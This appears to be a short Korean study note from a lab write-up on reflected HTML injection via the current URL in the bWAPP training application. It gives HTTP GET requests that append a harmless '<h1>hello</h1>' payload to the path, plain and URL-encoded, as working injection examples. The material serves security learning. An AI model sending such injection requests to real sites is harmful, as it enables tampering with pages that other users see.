# HTML Injection   Reflected\_URL

```http
GET /bWAPP/htmli_current_url.php HTTP/1.1
GET /bWAPP/htmli_current_url.php<h1>hello</h1> HTTP/1.1
```

```http
GET /bWAPP/htmli_current_url.php/<h1>hello</h1> HTTP/1.1
```

{% hint style="info" %}
URL에 HTML 소스를 추가하여 공격이 가능하다.

예:

```http
GET /bWAPP/htmli_current_url.php/%3ch1%3ehello%3c%2fh1%3e HTTP/1.1
```
{% endhint %}
